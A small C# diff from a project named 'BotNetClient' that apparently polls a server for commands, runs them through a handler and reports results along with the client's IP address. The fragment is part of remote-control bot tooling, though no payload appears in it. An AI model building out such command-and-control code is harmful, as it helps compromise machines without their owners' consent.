@@ -66,7 +66,7 @@ namespace BotNetClient
                                 string answer = HttpHandler.Class1.ResultCmd((id - 1).ToString()).Result;
                                 Stopwatch watch = new Stopwatch();
                                 watch.Start();
-                                string message = "Ответ от " + ipadress.ToString() + " : " + handler.handl(answer) + ". Time Used: " + watch.ElapsedMilliseconds + "ms";
+                                string message = "Ответ от " + ipadress.ToString() + " : " + handler.handl(answer, idc, ipadress.ToString()) + ". Time Used: " + watch.ElapsedMilliseconds + "ms";
                                 HttpHandler.Class1.SendResponse(message, ipadress.ToString());
                                 watch.Stop();
                                 id++;
